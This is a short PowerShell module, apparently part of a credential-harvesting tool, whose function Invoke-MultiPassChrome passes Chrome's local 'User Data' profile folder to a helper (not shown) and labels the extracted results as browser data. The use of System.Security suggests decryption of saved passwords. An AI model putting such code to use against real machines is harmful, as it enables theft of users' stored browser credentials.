# Add utils dependencies
# <% utils.add("MultiPassChromium.ps1") %>

# Add assembly dependencies
# <% assembly.add("System.Security") %>
function Invoke-MultiPassChrome {
    $export = MultiPassChromium("$($env:LOCALAPPDATA)\Google\Chrome\User Data")
    $export.category = "Browser"
    $export.software = "Chrome"
    return $export
}

